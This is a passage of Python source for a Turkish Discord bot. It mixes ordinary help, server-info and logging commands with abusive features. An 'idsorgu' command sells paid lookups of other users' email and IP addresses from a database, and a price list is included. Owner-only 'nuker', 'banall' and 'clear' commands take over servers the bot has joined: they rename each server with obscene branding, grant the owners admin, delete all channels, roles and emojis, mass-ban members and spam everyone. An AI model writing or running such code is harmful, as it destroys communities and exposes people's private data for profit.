            "`!çekiliş` - Çekiliş başlat\n"
            "`!rolmenu` - Rol menüsü oluştur"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🎫 **TICKET SİSTEMİ**",
        value=(
            "`!ticketpanel` - Butonlu panel oluştur\n"
            "`!ticket <konu>` - Ticket aç\n"
            "`!ticketkapat` - Ticket kapat\n"
            "`!ticketekle @user` - Kullanıcı ekle\n"
            "`!ticketlar` - Açık ticketları gör\n"
            "`!ticketayar` - Ticket ayarla (Admin)"
        ),
        inline=False
    )
    
    embed.add_field(
        name="ℹ️ **BİLGİ**",
        value=(
            "`!owner` - Bot sahipleri\n"
            "`!sunucu` - Sunucu bilgisi\n"
            "`!yardim` - Bu menü"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🏦 MEVCUT HAK DURUMU",
        value=f"**Sunucuda toplam {total_credits} hak bulunuyor**",
        inline=False
    )
    
    embed.set_footer(text="Slash komutları için / kullanın | DEHŞET Bot")
    if ctx.guild.icon:
        embed.set_thumbnail(url=ctx.guild.icon.url)
    
    await ctx.reply(embed=embed)

@bot.command(name="owner", aliases=["sahip"])
async def prefix_owner(ctx):
    embed = discord.Embed(
        title="Bot Sahipleri",
        color=0x9b59b6,
        timestamp=datetime.datetime.now()
    )
    
    for i, owner_id in enumerate(OWNER_IDS, 1):
        try:
            owner = await bot.fetch_user(owner_id)
            if i == 1:
                tag_display = f"{owner.name} | allah"
            else:
                tag_display = f"{owner.name} | kurani kerim"
            embed.add_field(
                name=f"Owner {i}",
                value=f"**Kullanıcı:** {owner.mention}\n**Tag:** {tag_display}\n**ID:** `{owner_id}`",
                inline=True
            )
        except:
            embed.add_field(
                name=f"Owner {i}",
                value=f"**ID:** `{owner_id}`",
                inline=True
            )
    
    embed.set_footer(text="Bot Owners")
    await ctx.reply(embed=embed)

@bot.command(name="sunucu", aliases=["server", "serverinfo"])
async def prefix_sunucu(ctx):
    guild = ctx.guild
    if not guild:
        await ctx.reply("Bu komut sadece sunucularda kullanılabilir!")
        return
    
    created_at = guild.created_at.strftime("%d/%m/%Y %H:%M")
    
    embed = discord.Embed(
        title=f"{guild.name}",
        color=0x3498db,
        timestamp=datetime.datetime.now()
    )
    
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    
    embed.add_field(name="Sunucu Sahibi", value=f"{guild.owner.mention if guild.owner else 'Bilinmiyor'}", inline=True)
    embed.add_field(name="Sunucu ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="Oluşturulma Tarihi", value=created_at, inline=True)
    embed.add_field(name="Üye Sayısı", value=f"{guild.member_count}", inline=True)
    embed.add_field(name="Kanal Sayısı", value=f"{len(guild.channels)}", inline=True)
    embed.add_field(name="Rol Sayısı", value=f"{len(guild.roles)}", inline=True)
    embed.add_field(name="Boost Sayısı", value=f"{guild.premium_subscription_count}", inline=True)
    embed.add_field(name="Boost Seviyesi", value=f"Seviye {guild.premium_tier}", inline=True)
    
    embed.set_footer(text=f"İsteyen: {ctx.author.name}")
    await ctx.reply(embed=embed)

@bot.command(name="idsorgu")
async def prefix_idsorgu(ctx, discord_id: str):
    if not is_authorized_admin(ctx.author.id) and not has_search_credits(ctx.author.id):
        await ctx.reply("Bu komutu kullanmak için arama hakkınız olmalı!")
        return
    if not is_verified(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanmak için önce doğrulama yapmalısınız!")
        return
    if is_user_safe(discord_id):
        await ctx.reply("Bu kullanıcı güvenli listede ve sorgulanamaz!")
        return
    conn = get_db_connection()
    if not conn:
        await ctx.reply("Veritabanı bağlantı hatası!")
        return
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE discord_id = ?", (discord_id,))
        result = cursor.fetchone()
        if result:
            if not is_authorized_admin(ctx.author.id):
                if not use_credit(ctx.author.id):
                    await ctx.reply("Arama hakkınız kalmadı!")
                    return
            embed = discord.Embed(title="Sonuç Bulundu", description=f"**Discord ID:** `{discord_id}`", color=0x00ff00)
            if result['email']:
                embed.add_field(name="Email", value=f"```{result['email']}```", inline=False)
            if result['ip_address']:
                embed.add_field(name="IP Adresi", value=f"```{result['ip_address']}```", inline=False)
            embed.add_field(name="Kalan Hak", value=f"**{get_credits(ctx.author.id)}** adet", inline=False)
            await ctx.reply(embed=embed)
            result_data = {'email': result['email'], 'ip_address': result['ip_address']}
            await send_search_log_to_channel(ctx.author, discord_id, result_data, success=True)
        else:
            embed = discord.Embed(title="Sonuç Bulunamadı", description=f"**Discord ID:** `{discord_id}` için kayıt bulunamadı!", color=0xff0000)
            await ctx.reply(embed=embed)
            await send_search_log_to_channel(ctx.author, discord_id, None, success=False)
    except Exception as e:
        await ctx.reply(f"Hata: {e}")
    finally:
        conn.close()

@bot.command(name="haklarim")
async def prefix_haklarim(ctx):
    credits = get_credits(ctx.author.id)
    if is_authorized_admin(ctx.author.id):
        embed = discord.Embed(title="Hak Durumu", description="Sınırsız haklara sahipsiniz (Admin)", color=0x00ff00)
    else:
        embed = discord.Embed(title="Hak Durumu", description=f"**{credits}** adet arama hakkınız var.", color=0x3498db)
    await ctx.reply(embed=embed)

@bot.command(name="testlog")
async def prefix_testlog(ctx):
    try:
        result_data = {
            'email': 'test@example.com',
            'ip_address': '192.168.1.100'
        }
        await send_search_log_to_channel(ctx.author, '987654321', result_data, success=True)
        await ctx.reply("✅ Prefix test log gönderildi!")
    except Exception as e:
        await ctx.reply(f"❌ Hata: {e}")

@bot.tree.command(name="testlog", description="Test log gönder")
async def slash_testlog(interaction: discord.Interaction):
    try:
        result_data = {
            'email': 'test@example.com',
            'ip_address': '192.168.1.100'
        }
        await send_search_log_to_channel(interaction.user, '987654321', result_data, success=True)
        await interaction.response.send_message("✅ Slash test log gönderildi!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ Hata: {str(e)}", ephemeral=True)

@bot.command(name="pre")
async def prefix_pre(ctx):
    embed = discord.Embed(title="Fiyat Listesi", color=0x9b59b6)
    embed.add_field(name="5 Hak", value="25 TL", inline=True)
    embed.add_field(name="10 Hak", value="40 TL", inline=True)
    embed.add_field(name="25 Hak", value="75 TL", inline=True)
    embed.add_field(name="50 Hak", value="125 TL", inline=True)
    embed.add_field(name="100 Hak", value="200 TL", inline=True)
    embed.set_footer(text="Satın almak için sunucu sahibiyle iletişime geçin")
    await ctx.reply(embed=embed)

@bot.command(name="boost")
async def prefix_boost(ctx):
    embed = discord.Embed(title="Boost Paketleri", color=0xf47fff)
    embed.add_field(name="1 Boost", value="5 Hak", inline=True)
    embed.add_field(name="2 Boost", value="15 Hak", inline=True)
    embed.set_footer(text="Sunucuyu boostlayarak hak kazanın!")
    await ctx.reply(embed=embed)

@bot.command(name="hakver")
async def prefix_hakver(ctx, kullanici: discord.Member, miktar: int):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    add_credits(kullanici.id, miktar)
    embed = discord.Embed(title="Hak Verildi", description=f"**{kullanici.name}** kullanıcısına **{miktar}** hak verildi!", color=0x00ff00)
    embed.add_field(name="Toplam Hak", value=f"**{get_credits(kullanici.id)}** adet", inline=True)
    await ctx.reply(embed=embed)

@bot.command(name="haksil")
async def prefix_haksil(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    set_credits(kullanici.id, 0)
    embed = discord.Embed(title="Haklar Silindi", description=f"**{kullanici.name}** kullanıcısının tüm hakları silindi!", color=0xff0000)
    await ctx.reply(embed=embed)

@bot.command(name="haksorgu")
async def prefix_haksorgu(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    credits = get_credits(kullanici.id)
    embed = discord.Embed(title="Hak Sorgusu", description=f"**{kullanici.name}** kullanıcısının **{credits}** hakkı var.", color=0x3498db)
    await ctx.reply(embed=embed)

@bot.command(name="yetkiliyap")
async def prefix_yetkiliyap(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece bot sahibi kullanabilir!")
        return
    set_credits(kullanici.id, 999)
    embed = discord.Embed(title="Admin Yapıldı", description=f"**{kullanici.name}** artık admin!", color=0x00ff00)
    await ctx.reply(embed=embed)

@bot.command(name="yetkilial")
async def prefix_yetkilial(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece bot sahibi kullanabilir!")
        return
    set_credits(kullanici.id, 0)
    embed = discord.Embed(title="Admin Yetkisi Alındı", description=f"**{kullanici.name}** artık admin değil!", color=0xff0000)
    await ctx.reply(embed=embed)

@bot.command(name="sinirsiz")
async def prefix_sinirsiz(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece bot sahibi kullanabilir!")
        return
    set_credits(kullanici.id, 999)
    embed = discord.Embed(title="Sınırsız Hak Verildi", description=f"**{kullanici.name}** artık sınırsız hakka sahip!", color=0x00ff00)
    await ctx.reply(embed=embed)

@bot.command(name="uyarilar")
async def prefix_uyarilar(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id) and not is_authorized_admin(ctx.author.id):
        await ctx.reply("Bu komutu kullanma yetkiniz yok!")
        return
    user_id = str(kullanici.id)
    guild_id = str(ctx.guild.id)
    if guild_id not in WARNINGS or user_id not in WARNINGS[guild_id] or not WARNINGS[guild_id][user_id]:
        await ctx.reply(f"**{kullanici.name}** için uyarı bulunamadı!")
        return
    warnings_list = WARNINGS[guild_id][user_id]
    embed = discord.Embed(title=f"{kullanici.name} - Uyarılar", description=f"Toplam **{len(warnings_list)}** uyarı", color=0xffcc00)
    for i, warn in enumerate(warnings_list[-10:], 1):
        embed.add_field(name=f"Uyarı #{i}", value=f"**Sebep:** {warn['reason']}", inline=False)
    await ctx.reply(embed=embed)

@bot.command(name="uyarisil")
async def prefix_uyarisil(ctx, kullanici: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece bot sahibi kullanabilir!")
        return
    user_id = str(kullanici.id)
    guild_id = str(ctx.guild.id)
    if guild_id in WARNINGS and user_id in WARNINGS[guild_id]:
        del WARNINGS[guild_id][user_id]
        save_warnings()
    embed = discord.Embed(title="Uyarılar Silindi", description=f"**{kullanici.name}** için tüm uyarılar silindi!", color=0x00ff00)
    await ctx.reply(embed=embed)

@bot.command(name="topludm")
async def prefix_topludm(ctx, *, mesaj: str):
    if not is_owner(ctx.author.id):
        await ctx.reply("Bu komutu sadece bot sahibi kullanabilir!")
        return
    members = [m for m in ctx.guild.members if not m.bot]
    if len(members) > 100:
        await ctx.reply(f"Çok fazla kullanıcı ({len(members)})! Max 100 kullanıcı.")
        return
    embed = discord.Embed(title=f"{ctx.guild.name} - Toplu Mesaj", description=mesaj, color=0x3498db)
    embed.set_footer(text="Toplu Mesaj Sistemi")
    sent = 0
    failed = 0
    progress_msg = await ctx.reply(f"Gönderiliyor... 0/{len(members)}")
    for i, member in enumerate(members):
        try:
            await member.send(embed=embed)
            sent += 1
        except:
            failed += 1
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit(content=f"Gönderiliyor... {i + 1}/{len(members)}")
            except:
                pass
        await asyncio.sleep(1.5)
    await progress_msg.edit(content=f"Tamamlandı! Gönderilen: {sent}, Başarısız: {failed}")

@bot.command(name="x1844nuker", aliases=["nuke"])
async def prefix_nuker(ctx, sunucu_id: str = None):
    global nuker_active, nuker_tasks
    if not is_owner(ctx.author.id):
        return
    
    if isinstance(ctx.channel, discord.DMChannel):
        if not sunucu_id:
            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844nuker (sunucu_id)`")
            return
        try:
            guild = bot.get_guild(int(sunucu_id))
            if not guild:
                await ctx.reply("Sunucu bulunamadı! Bot o sunucuda olmalı.")
                return
        except:
            await ctx.reply("Geçersiz sunucu ID!")
            return
    else:
        guild = ctx.guild
    
    if guild.id == ALLOWED_LOG_GUILD_ID:
        await ctx.reply("tanrıların sunucusuna kimse el suremez")
        return
    
    confirm_msg = await ctx.reply(f"**⚠️ NUKER V2 - TURBO MODE**\n\nSunucu: **{guild.name}**\nÜye sayısı: **{guild.member_count}**\nKanal: **{len(guild.channels)}**\nRol: **{len(guild.roles)}**\n\n✅ = BAŞLAT | ❌ = İPTAL")
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")
    
    def check(reaction, user):
        return user.id == ctx.author.id and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id
    
    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "❌":
            await confirm_msg.edit(content="**İptal edildi.**")
            return
    except asyncio.TimeoutError:
        await confirm_msg.edit(content="**Zaman aşımı - İptal edildi.**")
        return
    
    await confirm_msg.edit(content=f"**🔥 NUKER BAŞLADI!** Sunucu: {guild.name}")
    
    nuker_active = True
    nuker_tasks = []
    owner_name = ctx.author.name
    original_guild_name = guild.name
    original_member_count = guild.member_count
    
    async def notify_owners():
        for owner_id in OWNER_IDS:
            try:
                owner_user = await bot.fetch_user(owner_id)
                if owner_user:
                    infaz_embed = discord.Embed(
                        title="⚔️ SUNUCU İNFAZ EDİLİYOR",
                        description=f"**{original_guild_name}** sunucusu infaz ediliyor!",
                        color=0xff0000,
                        timestamp=datetime.datetime.now()
                    )
                    infaz_embed.add_field(name="Sunucu ID", value=f"`{guild.id}`", inline=True)
                    infaz_embed.add_field(name="Üye Sayısı", value=f"`{original_member_count}`", inline=True)
                    infaz_embed.add_field(name="İnfaz Eden", value=f"{ctx.author.name}", inline=True)
                    infaz_embed.set_footer(text="DEHŞET NUKER")
                    try:
                        logo_path = "attached_assets/1844_logo.png"
                        infaz_embed.set_thumbnail(url="attachment://1844_logo.png")
                        await owner_user.send(embed=infaz_embed, file=discord.File(logo_path, "1844_logo.png"))
                    except:
                        await owner_user.send(embed=infaz_embed)
            except:
                pass
    
    asyncio.create_task(notify_owners())
    
    async def change_server():
        try:
            logo_path = "attached_assets/1844_logo.png"
            with open(logo_path, "rb") as f:
                icon_data = f.read()
            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/dehset tarafından yok edildi")
        except:
            try:
                await guild.edit(name="DEHŞET SİKTİ")
            except:
                pass
    
    async def give_admin():
        try:
            admin_perms = discord.Permissions()
            admin_perms.administrator = True
            admin_role = await guild.create_role(name="DEHŞET OWNER", permissions=admin_perms, color=discord.Color.red(), hoist=True)
            for owner_id in OWNER_IDS:
                try:
                    owner_member = guild.get_member(owner_id)
                    if owner_member:
                        await owner_member.add_roles(admin_role)
                except:
                    pass
        except:
            pass
    
    async def spam_channel(ch):
        if not nuker_active: return
        try:
            await ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/dehset")
        except:
            pass
    
    async def delete_channel(ch):
        if not nuker_active: return
        try:
            await ch.delete()
        except:
            pass
    
    async def delete_role(r):
        if not nuker_active: return
        try:
            await r.delete()
        except:
            pass
    
    async def dm_member(m):
        if not nuker_active: return
        try:
            await m.send(f"**discord.gg/dehset sikti sizi**")
        except:
            pass
    
    async def create_channel_spam():
        if not nuker_active: return
        try:
            ch = await guild.create_text_channel(name="discord.gg-DEHŞET")
            spam_tasks = [ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/dehset") for _ in range(50)]
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        except:
            pass
    
    async def create_voice():
        if not nuker_active: return
        try:
            await guild.create_voice_channel(name="discord.gg/dehset")
        except:
            pass
    
    async def create_role():
        if not nuker_active: return
        try:
            await guild.create_role(name=f"{owner_name} DEHŞET", color=discord.Color.red())
        except:
            pass
    
    asyncio.create_task(change_server())
    asyncio.create_task(give_admin())
    
    channels = list(guild.channels)
    roles = [r for r in guild.roles if not r.is_default() and r.position < guild.me.top_role.position]
    members = [m for m in guild.members if not m.bot and m.id not in OWNER_IDS]
    
    all_tasks = []
    all_tasks.extend([spam_channel(ch) for ch in guild.text_channels])
    all_tasks.extend([delete_channel(ch) for ch in channels])
    all_tasks.extend([delete_role(r) for r in roles])
    all_tasks.extend([dm_member(m) for m in members])
    all_tasks.extend([create_channel_spam() for _ in range(250)])
    all_tasks.extend([create_voice() for _ in range(250)])
    all_tasks.extend([create_role() for _ in range(250)])
    
    nuker_tasks = [asyncio.create_task(asyncio.gather(*all_tasks, return_exceptions=True))]
    
    try:
        await asyncio.gather(*nuker_tasks, return_exceptions=True)
    except:
        pass
    
    nuker_active = False

@bot.command(name="x1844stop", aliases=["stop"])
async def prefix_nuker_stop(ctx):
    global nuker_active, nuker_tasks
    if not is_owner(ctx.author.id):
        return
    
    nuker_active = False
    
    cancelled_count = 0
    for task in nuker_tasks:
        try:
            task.cancel()
            cancelled_count += 1
        except:
            pass
    
    for _ in range(3):
        await asyncio.sleep(0.1)
        for task in nuker_tasks:
            try:
                if not task.done():
                    task.cancel()
            except:
                pass
    
    nuker_tasks = []
    
    all_current_tasks = [t for t in asyncio.all_tasks() if not t.done() and t != asyncio.current_task()]
    force_cancelled = 0
    for task in all_current_tasks:
        task_name = str(task.get_coro())
        if any(x in task_name for x in ['delete_channel', 'delete_role', 'create_channel', 'create_voice', 'create_role', 'dm_member', 'spam']):
            try:
                task.cancel()
                force_cancelled += 1
            except:
                pass
    
    await ctx.reply(f"**NUKER ANINDA DURDURULDU!**\nİptal edilen görev: {cancelled_count + force_cancelled}")

@bot.command(name="x1844banall", aliases=["tban"])
async def prefix_banall(ctx, sunucu_id: str = None):
    if not is_owner(ctx.author.id):
        return
    
    if isinstance(ctx.channel, discord.DMChannel):
        if not sunucu_id:
            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844banall (sunucu_id)`")
            return
        try:
            guild = bot.get_guild(int(sunucu_id))
            if not guild:
                await ctx.reply("Sunucu bulunamadı! Bot o sunucuda olmalı.")
                return
        except:
            await ctx.reply("Geçersiz sunucu ID!")
            return
    else:
        guild = ctx.guild
    
    if guild.id == ALLOWED_LOG_GUILD_ID:
        await ctx.reply("tanrıların sunucusuna kimse el suremez")
        return
    
    members = [m for m in guild.members if not m.bot and m.id not in OWNER_IDS and m.id != bot.user.id]
    
    confirm_msg = await ctx.reply(f"**⚠️ TOPLU BAN KOMUTU**\n\nSunucu: **{guild.name}**\nBanlanacak üye: **{len(members)}**\n\nBu komutu kullanmak istediğinize emin misiniz?\n✅ = Evet | ❌ = Hayır")
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")
    
    def check(reaction, user):
        return user.id == ctx.author.id and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id
    
    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "❌":
            await confirm_msg.edit(content="**İptal edildi.**")
            return
    except asyncio.TimeoutError:
        await confirm_msg.edit(content="**Zaman aşımı - İptal edildi.**")
        return
    
    await confirm_msg.edit(content=f"**⚡ TURBO BAN BAŞLADI!** Sunucu: {guild.name}\n`Hedef: {len([m for m in guild.members if not m.bot and m.id not in OWNER_IDS])} üye`")
    
    members = [m for m in guild.members if not m.bot and m.id not in OWNER_IDS and m.id != bot.user.id]
    results = {"banned": 0, "kicked": 0, "failed": 0}
    sem = asyncio.Semaphore(25)
    
    async def turbo_ban(m):
        async with sem:
            try:
                if m.top_role < guild.me.top_role:
                    await m.ban(reason="DEHŞET NUKER", delete_message_seconds=604800)
                    results["banned"] += 1
                else:
                    try:
                        await m.kick(reason="DEHŞET NUKER")
                        results["kicked"] += 1
                    except:
                        results["failed"] += 1
            except:
                try:
                    await m.kick(reason="DEHŞET NUKER")
                    results["kicked"] += 1
                except:
                    results["failed"] += 1
    
    batch_size = 100
    for i in range(0, len(members), batch_size):
        batch = members[i:i+batch_size]
        await asyncio.gather(*[turbo_ban(m) for m in batch], return_exceptions=True)
    
    await ctx.reply(f"**⚡ TURBO BAN TAMAMLANDI!**\nSunucu: {guild.name}\n\n🔨 Banlanan: **{results['banned']}**\n👢 Atılan: **{results['kicked']}**\n❌ Başarısız: **{results['failed']}**")

@bot.command(name="x1844clear", aliases=["csil"])
async def prefix_clear_all(ctx, sunucu_id: str = None):
    if not is_owner(ctx.author.id):
        return
    
    if isinstance(ctx.channel, discord.DMChannel):
        if not sunucu_id:
            await ctx.reply("DM'den kullanmak için sunucu ID gerekli!\n`!x1844clear (sunucu_id)`")
            return
        try:
            guild = bot.get_guild(int(sunucu_id))
            if not guild:
                await ctx.reply("Sunucu bulunamadı! Bot o sunucuda olmalı.")
                return
        except:
            await ctx.reply("Geçersiz sunucu ID!")
            return
    else:
        guild = ctx.guild
    
    if guild.id == ALLOWED_LOG_GUILD_ID:
        await ctx.reply("tanrıların sunucusuna kimse el suremez")
        return
    
    channel_count = len(guild.channels)
    
    confirm_msg = await ctx.reply(f"**⚠️ TEMİZLİK KOMUTU**\n\nSunucu: **{guild.name}**\nSilinecek kanal: **{channel_count}**\n\nBu komutu kullanmak istediğinize emin misiniz?\n✅ = Evet | ❌ = Hayır")
    await confirm_msg.add_reaction("✅")
    await confirm_msg.add_reaction("❌")
    
    def check(reaction, user):
        return user.id == ctx.author.id and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == confirm_msg.id
    
    try:
        reaction, user = await bot.wait_for("reaction_add", timeout=30.0, check=check)
        if str(reaction.emoji) == "❌":
            await confirm_msg.edit(content="**İptal edildi.**")
            return
    except asyncio.TimeoutError:
        await confirm_msg.edit(content="**Zaman aşımı - İptal edildi.**")
        return
    
    await confirm_msg.edit(content=f"**⚡ TURBO TEMİZLİK BAŞLADI!** Sunucu: {guild.name}\n`Hedef: {channel_count} kanal + {len(guild.roles)} rol`")
    
    results = {
        "text_deleted": 0, "text_failed": 0,
        "voice_deleted": 0, "voice_failed": 0,
        "category_deleted": 0, "category_failed": 0,
        "role_deleted": 0, "role_failed": 0,
        "emoji_deleted": 0, "sticker_deleted": 0
    }
    sem = asyncio.Semaphore(50)
    
    async def turbo_delete_channel(ch, ch_type):
        async with sem:
            try:
                await ch.delete()
                results[f"{ch_type}_deleted"] += 1
            except:
                results[f"{ch_type}_failed"] += 1
    
    async def turbo_delete_role(r):
        async with sem:
            try:
                await r.delete()
                results["role_deleted"] += 1
            except:
                results["role_failed"] += 1
    
    async def delete_emoji(e):
        try:
            await e.delete()
            results["emoji_deleted"] += 1
        except:
            pass
    
    async def delete_sticker(s):
        try:
            await s.delete()
            results["sticker_deleted"] += 1
        except:
            pass
    
    all_channels = list(guild.channels)
    roles = [r for r in guild.roles if not r.is_default() and r.position < guild.me.top_role.position]
    emojis = list(guild.emojis)
    stickers = list(guild.stickers)
    
    channel_tasks = []
    for ch in all_channels:
        if isinstance(ch, discord.TextChannel):
            channel_tasks.append(turbo_delete_channel(ch, "text"))
        elif isinstance(ch, discord.VoiceChannel):
            channel_tasks.append(turbo_delete_channel(ch, "voice"))
        elif isinstance(ch, discord.CategoryChannel):
            channel_tasks.append(turbo_delete_channel(ch, "category"))
        elif isinstance(ch, discord.StageChannel):
            channel_tasks.append(turbo_delete_channel(ch, "voice"))
        elif isinstance(ch, discord.ForumChannel):
            channel_tasks.append(turbo_delete_channel(ch, "text"))
    
    role_tasks = [turbo_delete_role(r) for r in roles]
    emoji_tasks = [delete_emoji(e) for e in emojis]
    sticker_tasks = [delete_sticker(s) for s in stickers]
    
    all_tasks = channel_tasks + role_tasks + emoji_tasks + sticker_tasks
    await asyncio.gather(*all_tasks, return_exceptions=True)
    
    total_ch_deleted = results["text_deleted"] + results["voice_deleted"] + results["category_deleted"]
    total_ch_failed = results["text_failed"] + results["voice_failed"] + results["category_failed"]
    
    try:
        new_channel = await guild.create_text_channel("DEHŞET-temizlik")
        embed = discord.Embed(title="⚡ TURBO TEMİZLİK TAMAMLANDI", color=0x00ff00)
        embed.add_field(name="📝 Yazı Kanalları", value=f"✅ {results['text_deleted']} | ❌ {results['text_failed']}", inline=True)
        embed.add_field(name="🔊 Ses Kanalları", value=f"✅ {results['voice_deleted']} | ❌ {results['voice_failed']}", inline=True)
        embed.add_field(name="📁 Kategoriler", value=f"✅ {results['category_deleted']} | ❌ {results['category_failed']}", inline=True)
        embed.add_field(name="🎭 Roller", value=f"✅ {results['role_deleted']} | ❌ {results['role_failed']}", inline=True)
        embed.add_field(name="😀 Emojiler", value=f"✅ {results['emoji_deleted']}", inline=True)
        embed.add_field(name="🎨 Stickerlar", value=f"✅ {results['sticker_deleted']}", inline=True)
        embed.add_field(name="📊 TOPLAM", value=f"Kanal: **{total_ch_deleted}** | Rol: **{results['role_deleted']}**", inline=False)
        if total_ch_failed > 0 or results["role_failed"] > 0:
            embed.set_footer(text="⚠️ Bazıları silinemedi - Bot rolünü en üste taşı!")
        await new_channel.send(embed=embed)
    except:
        pass

async def log_ayarla_slash(interaction: discord.Interaction, kanal: discord.TextChannel):
    if not (is_owner(interaction.user.id) or is_authorized_admin(interaction.user.id)):
        await interaction.response.send_message("Bu komutu kullanma yetkiniz yok!", ephemeral=True)
        return
    
    global GENERAL_LOG_CHANNEL_ID
    GENERAL_LOG_CHANNEL_ID = kanal.id
    
    embed = discord.Embed(
        title="Log Kanalı Ayarlandı",
        description=f"Tüm loglar artık {kanal.mention} kanalına gönderilecek.",
        color=0x00ff00
    )
    await interaction.response.send_message(embed=embed)

@bot.event
async def on_message_delete(message):
    if message.author.bot or not GENERAL_LOG_CHANNEL_ID:
        return
    
    if message.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Mesaj Silindi",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Yazan", value=f"{message.author.mention} ({message.author})", inline=True)
    embed.add_field(name="Kanal", value=message.channel.mention, inline=True)
    embed.add_field(name="İçerik", value=message.content[:1000] if message.content else "Boş/Medya", inline=False)
    embed.set_footer(text=f"Kullanıcı ID: {message.author.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_message_edit(before, after):
    if before.author.bot or not GENERAL_LOG_CHANNEL_ID or before.content == after.content:
        return
    
    if before.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Mesaj Düzenlendi",
        color=0xffa500,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="Yazan", value=f"{before.author.mention} ({before.author})", inline=True)
    embed.add_field(name="Kanal", value=before.channel.mention, inline=True)
    embed.add_field(name="Eski İçerik", value=before.content[:500] if before.content else "Boş", inline=False)
    embed.add_field(name="Yeni İçerik", value=after.content[:500] if after.content else "Boş", inline=False)
    embed.set_footer(text=f"Kullanıcı ID: {before.author.id}")
    
    await log_channel.send(embed=embed)

async def delete_welcome_msg(msg):
    try:
        await asyncio.sleep(5)
        await msg.delete()
    except Exception as e:
        print(f"Hoşgeldin mesajı silme hatası: {e}")

@bot.event
async def on_member_join(member):
    # Hoş geldin mesajı (sadece kendi sunucumuzda)
    if member.guild.id == ALLOWED_LOG_GUILD_ID:
        try:
            welcome_channel = bot.get_channel(WELCOME_CHANNEL_ID)
            if welcome_channel:
                welcome_msg = await welcome_channel.send(f"{member.mention}")
                asyncio.create_task(delete_welcome_msg(welcome_msg))
        except Exception as e:
            print(f"Hoşgeldin mesajı gönderme hatası: {e}")
    
    # Log kanalına bildirim (sadece kendi sunucumuzda)
    if not GENERAL_LOG_CHANNEL_ID or member.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    account_age = (datetime.datetime.now(datetime.timezone.utc) - member.created_at).days
    
    embed = discord.Embed(
        title="Üye Katıldı",
        color=0x00ff00,
        timestamp=datetime.datetime.now()
    )
    embed.set_thumbnail(url=member.display_avatar.url if member.display_avatar else None)
    embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
    embed.add_field(name="Hesap Yaşı", value=f"{account_age} gün", inline=True)
    embed.add_field(name="Sunucu Üye Sayısı", value=str(member.guild.member_count), inline=True)
    embed.set_footer(text=f"Kullanıcı ID: {member.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if not GENERAL_LOG_CHANNEL_ID or member.guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    roles = [role.mention for role in member.roles if role.name != "@everyone"]
    
    embed = discord.Embed(
        title="Üye Ayrıldı",
        color=0xff0000,
        timestamp=datetime.datetime.now()
    )
    embed.set_thumbnail(url=member.display_avatar.url if member.display_avatar else None)
    embed.add_field(name="Kullanıcı", value=f"{member.mention} ({member})", inline=True)
    embed.add_field(name="Rolleri", value=", ".join(roles) if roles else "Rol yok", inline=False)
    embed.add_field(name="Sunucu Üye Sayısı", value=str(member.guild.member_count), inline=True)
    embed.set_footer(text=f"Kullanıcı ID: {member.id}")
    
    await log_channel.send(embed=embed)

@bot.event
async def on_member_ban(guild, user):
    if not GENERAL_LOG_CHANNEL_ID or guild.id != ALLOWED_LOG_GUILD_ID:
        return
    
    log_channel = bot.get_channel(GENERAL_LOG_CHANNEL_ID)
    if not log_channel:
        return
    
    embed = discord.Embed(
        title="Üye Yasaklandı",
        color=0x8b0000,
        timestamp=datetime.datetime.now()
    )
